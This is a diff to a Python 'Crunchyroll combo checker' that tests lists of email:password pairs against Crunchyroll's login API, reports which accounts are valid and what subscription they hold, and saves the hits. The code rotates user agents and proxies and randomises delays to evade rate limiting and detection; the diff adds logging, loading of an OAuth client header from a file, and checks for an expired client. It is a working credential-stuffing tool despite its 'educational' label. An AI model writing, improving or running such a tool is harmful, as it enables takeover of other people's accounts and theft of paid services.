@@ -12,6 +12,7 @@ from __future__ import annotations
 import argparse
 import base64
 import json
+import logging
 import os
 import random
 import re
@@ -36,6 +37,8 @@ ACCOUNTS_ME_URL = "https://beta-api.crunchyroll.com/accounts/v1/me"
 APP_VERSION = "3.58.0"
 ANDROID_TV_BUILD = "22336"
 REQUEST_TIMEOUT = 30
+RATE_LIMIT_RETRY_MIN_SEC = 15
+RATE_LIMIT_RETRY_MAX_SEC = 30
 
 # Rotate User-Agent / client fingerprints (Android TV + mobile app style).
 USER_AGENTS = [
@@ -51,9 +54,6 @@ ACCEPT_LANGS = [
     "en-US,en;q=0.9,es;q=0.5",
 ]
 
-# 429 retries: wait 2s, 4s, 8s, 16s, 32s (max 5 retries after first 429).
-BACKOFF_429_SEC = [2, 4, 8, 16, 32]
-
 # Inter-check delay range (seconds); avoids fixed patterns.
 DELAY_MIN_SEC = 1.5
 DELAY_MAX_SEC = 5.0
@@ -65,9 +65,35 @@ BATCH_PAUSE_MAX_SEC = 22.0
 
 MAX_ACCOUNTS_PER_RUN = 300
 
+logger = logging.getLogger("crunchyroll_checker")
+if not logger.handlers:
+    logging.basicConfig(
+        level=logging.INFO,
+        format="%(asctime)s %(levelname)s %(name)s - %(message)s",
+    )
+
 
 def _authorization_header() -> str:
-    return os.environ.get("CRUNCHYROLL_AUTH", DEFAULT_AUTH_HEADER).strip()
+    env_val = os.environ.get("CRUNCHYROLL_AUTH")
+    if isinstance(env_val, str) and env_val.strip():
+        return env_val.strip()
+
+    # Convenience for API runs (server import) where CLI args/env may be harder to pass.
+    file_path = os.environ.get("CRUNCHYROLL_AUTH_FILE")
+    if not file_path:
+        file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "crunchyroll_auth.txt")
+
+    try:
+        if file_path and os.path.isfile(file_path):
+            with open(file_path, "r", encoding="utf-8", errors="replace") as f:
+                for line in f:
+                    s = (line or "").strip()
+                    if s:
+                        return s
+    except OSError:
+        pass
+
+    return DEFAULT_AUTH_HEADER
 
 
 class CheckStatus(str, Enum):
@@ -88,6 +114,28 @@ class CheckResult:
     @property
     def combo(self) -> str:
         return f"{self.email}:{self.password}"
+
+
+class AuthExpiredError(RuntimeError):
+    """Raised when Crunchyroll returns invalid_client / client_inactive."""
+
+
+def _contains_auth_expired_signal(status_code: int, body: object, raw_text: str) -> bool:
+    if isinstance(body, dict):
+        fields = [
+            body.get("error"),
+            body.get("error_code"),
+            body.get("code"),
+            body.get("message"),
+            body.get("error_description"),
+        ]
+        joined = " ".join(str(v) for v in fields if v is not None).lower()
+        if "invalid_client" in joined or "client_inactive" in joined:
+            return True
+    text = (raw_text or "").lower()
+    if "invalid_client" in text or "client_inactive" in text:
+        return True
+    return status_code == 401 and ("invalid_client" in text or "client_inactive" in text)
 
 
 def print_banner() -> None:
@@ -454,9 +502,18 @@ def _fetch_subscription_label(
             },
             timeout=20,
         )
+        raw_text = r.text or ""
+        body: object = {}
+        try:
+            body = r.json()
+        except (json.JSONDecodeError, ValueError):
+            body = {}
+        if _contains_auth_expired_signal(r.status_code, body, raw_text):
+            logger.error("AUTH_EXPIRED while fetching subscription details")
+            raise AuthExpiredError("AUTH_EXPIRED")
         if r.status_code != 200:
             return "Unknown"
-        data = r.json()
+        data = body
         if not isinstance(data, dict):
             return "Unknown"
         label = _infer_subscription_from_dict(data)
@@ -502,7 +559,7 @@ def check_credentials(
     auth = _authorization_header()
 
     response: Optional[requests.Response] = None
-    for attempt in range(6):
+    for attempt in range(2):
         headers = _random_browser_headers(auth)
         try:
             response = sess.post(
@@ -513,17 +570,20 @@ def check_credentials(
                 allow_redirects=True,
             )
         except requests.RequestException as e:
+            logger.error("Network error for %s: %s", email, e)
             return CheckResult(CheckStatus.ERROR, email, password, str(e), "")
 
         if response.status_code == 429:
-            if attempt < 5:
-                time.sleep(BACKOFF_429_SEC[attempt] + random.uniform(0.0, 0.5))
+            if attempt < 1:
+                wait_s = random.uniform(RATE_LIMIT_RETRY_MIN_SEC, RATE_LIMIT_RETRY_MAX_SEC)
+                logger.warning("429 for %s; waiting %.2fs then retrying once", email, wait_s)
+                time.sleep(wait_s)
                 continue
             return CheckResult(
                 CheckStatus.ERROR,
                 email,
                 password,
-                "HTTP 429 Too Many Requests (max retries)",
+                "HTTP 429 Too Many Requests (retry exhausted)",
                 "",
             )
         break
@@ -550,9 +610,17 @@ def check_credentials(
             "",
         )
 
+    body: object = {}
     try:
         body = r.json()
     except (json.JSONDecodeError, ValueError):
+        body = {}
+
+    if _contains_auth_expired_signal(r.status_code, body, r.text or ""):
+        logger.error("AUTH_EXPIRED detected during token request for %s", email)
+        raise AuthExpiredError("AUTH_EXPIRED")
+
+    if not isinstance(body, dict):
         return CheckResult(
             CheckStatus.ERROR,
             email,
@@ -561,17 +629,16 @@ def check_credentials(
             "",
         )
 
-    if r.status_code == 200 and isinstance(body, dict) and body.get("access_token"):
+    if r.status_code == 200 and body.get("access_token"):
         sub = _fetch_subscription_label(sess, str(body["access_token"]), body)
         return CheckResult(CheckStatus.VALID, email, password, "", sub)
 
     err = ""
-    if isinstance(body, dict):
-        err = str(body.get("error") or body.get("error_code") or "")
-        code = str(body.get("code") or "")
-        hint = body.get("error_description") or body.get("message")
-        parts = [p for p in (err, code, hint) if p]
-        err = " | ".join(parts) if parts else str(body)
+    err = str(body.get("error") or body.get("error_code") or "")
+    code = str(body.get("code") or "")
+    hint = body.get("error_description") or body.get("message")
+    parts = [p for p in (err, code, hint) if p]
+    err = " | ".join(parts) if parts else str(body)
 
     low = (err or "").lower()
     if "invalid_client" in low or "client_inactive" in low:
@@ -579,7 +646,7 @@ def check_credentials(
             CheckStatus.ERROR,
             email,
             password,
-            "invalid_client (update CRUNCHYROLL_AUTH - see bot.py header comment)",
+            "invalid_client — set CRUNCHYROLL_AUTH (env) or put Basic header in crunchyroll_auth.txt",
             "",
         )
 
@@ -597,9 +664,11 @@ def check_credentials(
         or "invalid_credentials" in low
         or r.status_code == 401
     ):
+        logger.info("Invalid account: %s", email)
         return CheckResult(CheckStatus.INVALID, email, password, err or f"HTTP {r.status_code}", "")
 
     if r.status_code >= 500 or "cloudflare" in str(body).lower():
+        logger.error("Server/protection error for %s: %s", email, err or f"HTTP {r.status_code}")
         return CheckResult(
             CheckStatus.ERROR,
             email,
@@ -609,6 +678,31 @@ def check_credentials(
         )
 
     return CheckResult(CheckStatus.INVALID, email, password, err or f"HTTP {r.status_code}", "")
+
+
+def auth_precheck(proxy_urls: Optional[List[str]] = None) -> None:
+    """
+    Optional lightweight auth test before batch:
+    - invalid_client/client_inactive -> raises AuthExpiredError("AUTH_EXPIRED")
+    - invalid_grant/invalid_credentials -> auth header accepted, continue batch
+    """
+    proxies: Optional[Dict[str, str]] = None
+    cleaned = [_normalize_proxy_url(u) for u in (proxy_urls or []) if _normalize_proxy_url(u)]
+    if cleaned:
+        proxies = _proxy_dict_from_url(cleaned[0])
+    sess = requests.Session()
+    try:
+        check_credentials(
+            "__auth_check__@example.com",
+            "__auth_check_invalid_password__",
+            proxies=proxies,
+            session=sess,
+        )
+    except AuthExpiredError:
+        logger.error("AUTH_EXPIRED detected before batch start")
+        raise
+    finally:
+        sess.close()
 
 
 def check_combo_line_with_session(
@@ -701,7 +795,14 @@ def iter_checks_sequential(
             if i > 0:
                 time.sleep(random.uniform(DELAY_MIN_SEC, DELAY_MAX_SEC) + max(0.0, extra_delay))
 
-            result = check_combo_line_with_session(line, session, extra_delay=0.0)
+            try:
+                result = check_combo_line_with_session(line, session, extra_delay=0.0)
+            except AuthExpiredError:
+                logger.error("AUTH_EXPIRED during sequential run; stopping safely")
+                raise
+            except Exception as e:
+                logger.exception("Unexpected error for combo line '%s': %s", line, e)
+                result = CheckResult(CheckStatus.ERROR, "", "", f"unexpected error: {e}", "")
 
             if result.status == CheckStatus.ERROR and cleaned:
                 idx = (idx + 1) % len(cleaned)
@@ -805,6 +906,7 @@ def run_checks_collecting(
 ) -> tuple[RunSummary, List[CheckResult]]:
     """API default: sequential human-like pacing (ignores max_workers for ordering)."""
     start = time.perf_counter()
+    auth_precheck(proxy_urls)
     results = list(iter_checks_sequential(combos, proxy_urls, extra_delay))
     elapsed = time.perf_counter() - start
     summary = build_summary(results, elapsed)
@@ -845,6 +947,16 @@ def write_valid_file(path: str, lines: List[str]) -> None:
 
 def parse_args(argv: Optional[List[str]] = None) -> argparse.Namespace:
     p = argparse.ArgumentParser(description="Crunchyroll combo checker (educational).")
+    p.add_argument(
+        "--cr-auth",
+        metavar="BASIC_HEADER",
+        help="OAuth Basic header for Crunchyroll token requests. Overrides CRUNCHYROLL_AUTH.",
+    )
+    p.add_argument(
+        "--cr-auth-file",
+        metavar="FILE",
+        help="Path to a text file containing the OAuth Basic header. Overrides CRUNCHYROLL_AUTH.",
+    )
     p.add_argument(
         "-c",
         "--combo",
@@ -900,6 +1012,16 @@ def parse_args(argv: Optional[List[str]] = None) -> argparse.Namespace:
 
 def main(argv: Optional[List[str]] = None) -> int:
     args = parse_args(argv)
+
+    if args.cr_auth:
+        os.environ["CRUNCHYROLL_AUTH"] = args.cr_auth.strip()
+    elif args.cr_auth_file:
+        auth_path = args.cr_auth_file.strip()
+        if not os.path.isfile(auth_path):
+            print(f"{Fore.RED}[ERROR] --cr-auth-file not found: {auth_path!r}{Style.RESET_ALL}")
+            return 1
+        with open(auth_path, "r", encoding="utf-8", errors="replace") as f:
+            os.environ["CRUNCHYROLL_AUTH"] = (f.read().strip())
 
     if not args.no_banner:
         print_banner()
